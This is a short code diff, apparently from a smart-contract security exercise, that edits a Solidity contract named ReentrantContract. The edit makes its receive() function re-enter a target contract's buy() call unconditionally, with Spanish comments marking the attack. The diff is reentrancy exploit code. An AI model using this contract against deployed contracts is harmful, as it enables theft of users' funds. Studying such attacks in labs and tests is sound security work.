@@ -9,18 +9,17 @@ contract ReentrantContract {
     }
 
     receive() external payable {
-        if (address(targetContract).balance >= 0.1 ether) {
-            (bool success, ) = targetContract.call{value: 0.1 ether}(
-                abi.encodeWithSignature("buy()")
-            );
-            require(success, "Reentrancy attack failed");
-        }
+        // ¡OJO! Aquí forzamos que siempre intente reentrar:
+        (bool success, ) = targetContract.call{value: 0.1 ether}(
+            abi.encodeWithSignature("buy()")
+        );
+        require(success, "Reentrancy attack failed");
     }
 
     function attack() external payable {
         require(msg.value == 0.1 ether, "Incorrect ETH amount");
 
-        // Iniciar el ataque
+        // Iniciar el ataque llamando a `buy` por primera vez
         (bool success, ) = targetContract.call{value: msg.value}(
             abi.encodeWithSignature("buy()")
         );
